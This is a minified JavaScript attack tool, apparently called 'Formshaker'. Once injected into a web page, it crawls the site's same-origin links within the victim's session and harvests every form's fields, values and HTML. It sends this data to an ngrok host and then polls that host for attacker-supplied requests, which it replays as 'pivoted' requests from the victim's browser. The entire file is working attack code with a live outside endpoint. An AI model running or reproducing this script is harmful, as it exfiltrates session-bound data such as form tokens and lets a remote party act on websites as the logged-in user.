var $jscomp=$jscomp||{};$jscomp.scope={};$jscomp.createTemplateTagFirstArg=function(c){return c.raw=c};$jscomp.createTemplateTagFirstArgWithRaw=function(c,d){c.raw=d;return c};$jscomp.arrayIteratorImpl=function(c){var d=0;return function(){return d<c.length?{done:!1,value:c[d++]}:{done:!0}}};$jscomp.arrayIterator=function(c){return{next:$jscomp.arrayIteratorImpl(c)}};$jscomp.makeIterator=function(c){var d="undefined"!=typeof Symbol&&Symbol.iterator&&c[Symbol.iterator];return d?d.call(c):$jscomp.arrayIterator(c)};
$jscomp.ASSUME_ES5=!1;$jscomp.ASSUME_NO_NATIVE_MAP=!1;$jscomp.ASSUME_NO_NATIVE_SET=!1;$jscomp.SIMPLE_FROUND_POLYFILL=!1;$jscomp.ISOLATE_POLYFILLS=!1;$jscomp.FORCE_POLYFILL_PROMISE=!1;$jscomp.FORCE_POLYFILL_PROMISE_WHEN_NO_UNHANDLED_REJECTION=!1;$jscomp.defineProperty=$jscomp.ASSUME_ES5||"function"==typeof Object.defineProperties?Object.defineProperty:function(c,d,e){if(c==Array.prototype||c==Object.prototype)return c;c[d]=e.value;return c};
$jscomp.getGlobal=function(c){c=["object"==typeof globalThis&&globalThis,c,"object"==typeof window&&window,"object"==typeof self&&self,"object"==typeof global&&global];for(var d=0;d<c.length;++d){var e=c[d];if(e&&e.Math==Math)return e}throw Error("Cannot find global object");};$jscomp.global=$jscomp.getGlobal(this);$jscomp.IS_SYMBOL_NATIVE="function"===typeof Symbol&&"symbol"===typeof Symbol("x");$jscomp.TRUST_ES6_POLYFILLS=!$jscomp.ISOLATE_POLYFILLS||$jscomp.IS_SYMBOL_NATIVE;$jscomp.polyfills={};
$jscomp.propertyToPolyfillSymbol={};$jscomp.POLYFILL_PREFIX="$jscp$";var $jscomp$lookupPolyfilledValue=function(c,d){var e=$jscomp.propertyToPolyfillSymbol[d];if(null==e)return c[d];e=c[e];return void 0!==e?e:c[d]};$jscomp.polyfill=function(c,d,e,f){d&&($jscomp.ISOLATE_POLYFILLS?$jscomp.polyfillIsolated(c,d,e,f):$jscomp.polyfillUnisolated(c,d,e,f))};
$jscomp.polyfillUnisolated=function(c,d,e,f){e=$jscomp.global;c=c.split(".");for(f=0;f<c.length-1;f++){var g=c[f];if(!(g in e))return;e=e[g]}c=c[c.length-1];f=e[c];d=d(f);d!=f&&null!=d&&$jscomp.defineProperty(e,c,{configurable:!0,writable:!0,value:d})};
$jscomp.polyfillIsolated=function(c,d,e,f){var g=c.split(".");c=1===g.length;f=g[0];f=!c&&f in $jscomp.polyfills?$jscomp.polyfills:$jscomp.global;for(var k=0;k<g.length-1;k++){var h=g[k];if(!(h in f))return;f=f[h]}g=g[g.length-1];e=$jscomp.IS_SYMBOL_NATIVE&&"es6"===e?f[g]:null;d=d(e);null!=d&&(c?$jscomp.defineProperty($jscomp.polyfills,g,{configurable:!0,writable:!0,value:d}):d!==e&&($jscomp.propertyToPolyfillSymbol[g]=$jscomp.IS_SYMBOL_NATIVE?$jscomp.global.Symbol(g):$jscomp.POLYFILL_PREFIX+g,g=
$jscomp.propertyToPolyfillSymbol[g],$jscomp.defineProperty(f,g,{configurable:!0,writable:!0,value:d})))};$jscomp.polyfill("Object.is",function(c){return c?c:function(d,e){return d===e?0!==d||1/d===1/e:d!==d&&e!==e}},"es6","es3");$jscomp.polyfill("Array.prototype.includes",function(c){return c?c:function(d,e){var f=this;f instanceof String&&(f=String(f));var g=f.length;e=e||0;for(0>e&&(e=Math.max(e+g,0));e<g;e++){var k=f[e];if(k===d||Object.is(k,d))return!0}return!1}},"es7","es3");
$jscomp.checkStringArgs=function(c,d,e){if(null==c)throw new TypeError("The 'this' value for String.prototype."+e+" must not be null or undefined");if(d instanceof RegExp)throw new TypeError("First argument to String.prototype."+e+" must not be a regular expression");return c+""};$jscomp.polyfill("String.prototype.includes",function(c){return c?c:function(d,e){return-1!==$jscomp.checkStringArgs(this,d,"includes").indexOf(d,e||0)}},"es6","es3");
$jscomp.polyfill("String.prototype.endsWith",function(c){return c?c:function(d,e){var f=$jscomp.checkStringArgs(this,d,"endsWith");d+="";void 0===e&&(e=f.length);e=Math.max(0,Math.min(e|0,f.length));for(var g=d.length;0<g&&0<e;)if(f[--e]!=d[--g])return!1;return 0>=g}},"es6","es3");var limit=30,linkHolder={},SCPReferenciado=[],visitedDomains=[],success=found=executionTime=0,currentDomain=null,stopped=!1,test="",matches=[];
function getLinks(c,d){parsedDocument=(new DOMParser).parseFromString(c,"text/html");a_elemnts=parsedDocument.querySelectorAll("a");c=$jscomp.makeIterator(a_elemnts);for(var e=c.next();!e.done;e=c.next())if(a_elemnt=e.value,url=a_elemnt.href)pathname=(new URL(url)).pathname,/\.(gif|jpg|jpeg|tiff|png|woff|woff2|pdf|js)$/i.test(pathname)||/logout/i.test(pathname)||(originHost=(new URL(d)).host,newURLHost=(new URL(url)).host,originHost==newURLHost&&(hash=(new URL(url)).hash,0==hash.length&&(matches.includes(url)||
test_rewriteURL(url))));return matches}function removeComments(c){return c.replace(/(?:<!-[^>]*>|\/\*(?:[^*]|\*[^\/])*?\*\/)/gm,"").replace(/([^:])\/\/.*/gm,"$1")}function getLocationInfo(c){var d=document.createElement("a");d.href=c;return d}function getDomain(c){return c.match(/^\w+:\/\/[^\/]+/)[0]}
function relativeToAbsolute(c,d){var e=getAbsolutePath(d)+"/";d=getDomain(d)+"/";for(var f=c.length,g;f--;)g=c[f],-1===g.search(/^\w+:\/\//i)&&(g=("/"===g.charAt(0)?d:e)+g),c[f]=g.replace(/([^:])\/\/+/g,"$1/");return c}function getAbsolutePath(c){return c.match(/^\w+:\/\/[^\/]+\/*(?:[^\/\.]+(?:\/+|\r)|\.\.\/)*/)[0]}
function getUnvisitedURI(){for(var c=0,d=visitedDomains.length,e;c<d;++c){e=visitedDomains[c];for(var f in linkHolder)if(~f.indexOf(e)&&"_"===linkHolder[f].status)return f}if(currentDomain){for(f in linkHolder)if(~f.indexOf(currentDomain)&&"_"===linkHolder[f].status)return f;visitedDomains.push(currentDomain)}for(f in linkHolder)if("_"===linkHolder[f].status)return currentDomain=getLocationInfo(f).hostname,f;return null}function LinkInfo(c){this.origin=c}LinkInfo.prototype={status:"_",origin:""};
function pushLinks(c,d){if(c)for(var e=c.length;e--;)linkHolder[c[e]]||(linkHolder[c[e]]=new LinkInfo(d),++found)}function getExecutionTime(){return(new Date(Date.now()-executionTime)).toISOString().match(/([^T]*)Z$/)[1]}function toLink(c){return'<a href="'+c+'" target="_blank">'+c+"</a>"}
function getstatus(){var c=[],d=[],e=[],f=[],g;for(g in linkHolder){switch(linkHolder[g].status){case "_":type=e;break;case "V":type=c;break;case "X":type=d;break;case "R":type=f}type.push(linkHolder[g].status+" "+toLink(g)+"<span>&nbsp;"+toLink(linkHolder[g].origin)+"</span>")}console.log(["Execution time: "+getExecutionTime(),found+" found",e.length+" unvisited",c.length+" visited",f.length+" redirected",d.length+" broken"].join("\n"));return{broken:d,visited:c,unvisited:e,redirected:f}}
function showLinks(){var c=getstatus();c=["Execution time: "+getExecutionTime(),found+" found",c.unvisited.length+" unvisited",c.visited.length+" visited",c.redirected.length+" redirected",c.broken.length+" broken","<br/>","### BROKEN: "+c.broken.length,c.broken.sort().join("<br/>"),"<br/>","### REDIRECTED: "+c.redirected.length,c.redirected.sort().join("<br/>"),"<br/>","### REDUNDANT: "+redundantURLs.length,redundantURLs.sort().join("<br/>"),"<br/>","### VISITED: "+c.visited.length,c.visited.sort().join("<br/>"),
"<br/>","### UNVISITED: "+c.unvisited.length,c.unvisited.sort().join("<br/>")];var d=open(null,"_blank");d?d.document.write("<head><style>a {color: #555;text-decoration: none;} span a {color: #bbb;}</style></head><body><div style=\"white-space:nowrap;font-size: 12px; font-family: Consolas,'Lucida Console','DejaVu Sans Mono',monospace;\">"+c.join("<br/>")+"</pre></div></body>"):alert("Popup bloqueado.")}
function visitLink(c){c?(xhr=new XMLHttpRequest,xhr.timeout=4E3,xhr.open("GET",c),xhr.ontimeout=function(){console.log("Failed from timeout "+c);linkHolder[c].status="X";run()},xhr.onreadystatechange=function(){if(xhr.readyState==XMLHttpRequest.DONE&&0<=xhr.getResponseHeader("Content-Type").indexOf("text/html")){var d=xhr.status;0===d||200<=d&&400>d?(data=xhr.responseText,++success,linkHolder[c].status="V","string"===typeof data&&getForms(data,c),pushLinks(getLinks(data,c),c)):linkHolder[c].status=
"X";run()}},xhr.send()):console.log("FINISHED (no more links to crawl)")}arrLengths=[];arrPosition=[];var $jscomp$templatelit$m1529127493$0=$jscomp.createTemplateTagFirstArg(["&"]),$jscomp$templatelit$m1529127493$1=$jscomp.createTemplateTagFirstArg(["="]);
function getParamNames(c){var d=[];c.search&&c.search.substr(1).split($jscomp$templatelit$m1529127493$0).forEach(function(e){e=$jscomp.makeIterator(e.split($jscomp$templatelit$m1529127493$1));var f=e.next().value;e.next();d.push(f)||""});d.sort();return _qParams=d.join("")}params=[];redundantURLs=[];
function test_rewriteURL(c){_url=new URL(c);pathname=_url.pathname.endsWith("/")?_url.pathname:_url.pathname+"/";queryParams="";""!=_url.search&&(queryParams=getParamNames(_url));pathquerylen=pathname.length+queryParams.length;if(0<matches.length){samelength=!1;for(x in arrLengths)if(arrLengths[x]==pathquerylen&&(samelength=!0,""!=_url.search&&!params.includes(pathname+"?"+queryParams))){redundantURLs.push(c);params.push(pathname+"?"+queryParams);return}if(samelength){arrypathname=pathname.split("/");
foundinknownpositions=!1;if(0<arrPosition.length)for(y in path_id=!1,arrPosition)if(path=arrypathname[arrPosition[y]],null!=path&&""!=path&&isit_a_pathid(path)){console.log("1) path id: "+path);redundantURLs.push(c);path_id=foundinknownpositions=!0;break}if(0==foundinknownpositions){path_id=!1;for(y in arrypathname)if(path=arrypathname[y],null!=path&&""!=path&&isit_a_pathid(path)){console.log("2) path id: "+path);redundantURLs.push(c);path_id=!0;break}path_id||matches.push(c)}}else arrLengths.push(pathquerylen),
matches.push(c)}else arrLengths.push(pathquerylen),matches.push(c)}function isit_a_pathid(c){pathlength=c.length;pathnumbers=c.replace(/\D/g,"");if(""!==pathnumbers&&(path_count_of_numbers=pathnumbers.length,2<path_count_of_numbers&&8<=pathlength&&path_count_of_numbers>=path_count_of_numbers/3))return arrPosition.includes(y)||arrPosition.push(y),!0}function b64ToUint6(c){return 64<c&&91>c?c-65:96<c&&123>c?c-71:47<c&&58>c?c+4:43===c?62:47===c?63:0}
function base64DecToArr(c,d){c=c.replace(/[^A-Za-z0-9\+\/]/g,"");var e=c.length;d=d?Math.ceil((3*e+1>>2)/d)*d:3*e+1>>2;for(var f=new Uint8Array(d),g,k=0,h=0,l=0;l<e;l++)if(g=l&3,k|=b64ToUint6(c.charCodeAt(l))<<18-6*g,3===g||1===e-l){for(g=0;3>g&&h<d;g++,h++)f[h]=k>>>(16>>>g&24)&255;k=0}return f}function _base64ToArrayBuffer(c){c=window.atob(c);for(var d=c.length,e=new Uint8Array(d),f=0;f<d;f++)e[f]=c.charCodeAt(f);return e.buffer}
var App={notify:function(c,d){console.log(c+"! "+d)},getErrorMessage:function(c){return"HTTP status code: "+c.status}};tmp="";
function Pivot_HTTPRequest(c){tmp=c;for(i in c){payload=c[i];var d="";console.log(payload.action);if("multipart/form-data"==payload.enctype)for(index in console.log("multipart/form-data"),payload.enctype=!1,d=new FormData,payload.inputs)value=decodeURIComponent(payload.inputs[index].value),"file"==payload.inputs[index].Type?value?(b=Uint8Array.from(atob(value),function(f){return f.charCodeAt(0)}),a=new Blob([b],{type:"image/png"}),a=new File([a],"image.png",{type:"image/png"}),d.append(payload.inputs[index].name,
a)):d.append(payload.inputs[index].name,value):d.append(payload.inputs[index].name,value);else for(index in console.log("no multipart/form-data"),payload.inputs)name=payload.inputs[index].name,value=payload.inputs[index].value,d=d.concat(name+"="+value+"&");var e=new XMLHttpRequest;e.open(payload.method,payload.action);e.timeout=4E3;e.ontimeout=function(){App.notify("timeout","Pivoted request timeout")};e.onreadystatechange=function(){e.readyState==XMLHttpRequest.HEADERS_RECEIVED&&App.notify("success",
"Pivoted request successfully made! - "+e.status)};e.send(d)}}var sendTime=!1;
function sendForms(c){postParameters=c;if(!sendTime){sendTime=!0;var d=new Date;c=d.getFullYear();var e="Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" ")[d.getMonth()],f=d.getDate(),g=d.getHours(),k=d.getMinutes();d=d.getSeconds();postParameters+="&time="+encodeURIComponent(f+" "+e+" "+c+" "+g+":"+k+":"+d)}var h=new XMLHttpRequest;h.open("POST","https://c82c1277d5c8.ngrok.io/api/forms/");h.timeout=4E3;h.ontimeout=function(){App.notify("timeout","Formshaker webpage timeout")};h.onreadystatechange=
function(){h.readyState==XMLHttpRequest.HEADERS_RECEIVED&&App.notify("success","Formshaker successfully connected!")};h.send(postParameters)}
function getModifiedForms(){var c=new XMLHttpRequest;c.open("GET","https://c82c1277d5c8.ngrok.io/api/forms/");c.timeout=4E3;c.ontimeout=function(){App.notify("timeout","Formshaker webpage timeout")};c.onreadystatechange=function(){c.readyState==XMLHttpRequest.DONE&&(Pivot_HTTPRequest(JSON.parse(c.responseText)),App.notify("success","Formshaker successfully connected!"))};c.send(postParameters)}function Input(c,d,e,f){this.type=c;this.name=d;this.value=e;this.defaultValue=f}
function Form(c,d,e,f,g){this.origin=g;this.action=c;this.method=d;this.outerHTML=f;this.enctype=e;this.inputs=[];this.base64link=this.id=this.queryForm="";this.setInputs=function(k){this.inputs.push(k)};hashCode=function(k){return k.split("").reduce(function(h,l){h=(h<<5)-h+l.charCodeAt(0);return h&h},0)};this.setId=function(k){parameters="";k.inputs.forEach(function(h){parameters=parameters.concat(h.name)});this.id=hashCode(parameters+k.action+k.method).toString()};this.setQuery=function(k){queryForm=
"";k.inputs.forEach(function(h){"checkbox"!=h.type&&"submit"!=h.type&&(queryForm=queryForm.concat(h.name+"="+h.value+"&"))});this.queryForm=queryForm};this.setBase64Link=function(){this.base64link="data:text/html;base64,"+btoa(unescape(encodeURIComponent("<center>"+this.outerHTML+"</center>")))};this.getFormAsJson=function(){return JSON.stringify(this)}}var forms=[],debug=[],debug2="",o=0;
function getForms(c,d){forms_dict=[];inputs_dict=[];id=0;parsedDocument=(new DOMParser).parseFromString(c,"text/html");c=$jscomp.makeIterator(parsedDocument.forms);for(var e=c.next();!e.done;e=c.next()){form=e.value;inputs_dict.push([]);forms_dict.push(form);e=form.elements;for(i=0;i<e.length;i++)inputs_dict[id].push(e[i]);setFormObjects(id,inputs_dict,forms_dict,d);id++}}
function setFormObjects(c,d,e,f){i=0;form_tmp=e[c];inputs_tmp=d[c];form=new Form(form_tmp.action,form_tmp.method,form_tmp.enctype,form_tmp.outerHTML,f);for(j=0;j<inputs_tmp.length;j++){c=inputs_tmp[j];if(c.name)if("select-one"==c.type){d=[];e="";f=$jscomp.makeIterator(c.options);for(var g=f.next();!g.done;g=f.next())g=g.value,g.selected&&(e=g.value),d.push({value:g.value,text:g.text,selected:g.selected});form.setInputs(new Input(c.type,c.name,JSON.stringify(d),e))}else form.setInputs(new Input(c.type,
c.name,c.value,""));i++}form.setId(form);form.setQuery(form);form.setBase64Link();containsObject(form,forms)||(sendForms(form.getFormAsJson()),forms.push(form))}function containsObject(c,d){for(var e=0;e<d.length;e++)if(d[e].id==c.id)return!0}function run(){success<limit&&!stopped?visitLink(getUnvisitedURI()):(stopped=!0,showLinks(),limit=(success/limit>>0)*limit+limit);console.log("fin run")}
function start(c){stopped=!1;console.log("RUNNING...\nUse getstatus() and showLinks()");executionTime=Date.now();run()}function importScript(c){var d=document.createElement("script");d.type="text/javascript";d.src=c;(document.head||document.body).appendChild(d)}importScript("//ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js");importScript("https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.10.0/js/md5.js");
setTimeout(function(){getForms(document.body.outerHTML,location.href);pushLinks([location.href])},3E3);setTimeout(start,4E3);setInterval(function(){getModifiedForms()},3E3);
